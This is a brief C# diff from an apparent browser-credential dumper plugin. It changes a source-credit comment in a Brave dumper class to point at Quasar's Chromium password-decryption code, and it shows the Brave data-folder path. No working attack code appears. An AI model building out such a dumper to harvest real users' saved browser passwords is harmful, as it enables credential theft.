@@ -14,7 +14,7 @@ namespace Plugin48Dumper
     internal class clsBraveDumper : clsDumper
     {
         /// <summary>
-        /// Acknowledgement: https://github.com/quasar/Quasar/blob/master/Quasar.Client/Recovery/Browsers/BravePassReader.cs
+        /// Acknowledgement: https://github.com/quasar/Quasar/blob/master/Quasar.Client/Recovery/Browsers/ChromiumDecryptor.cs
         /// </summary>
 
         private string BraveDir { get { return Path.Combine(ApplicationData, "BraveSoftware", "Brave-Browser"); } }
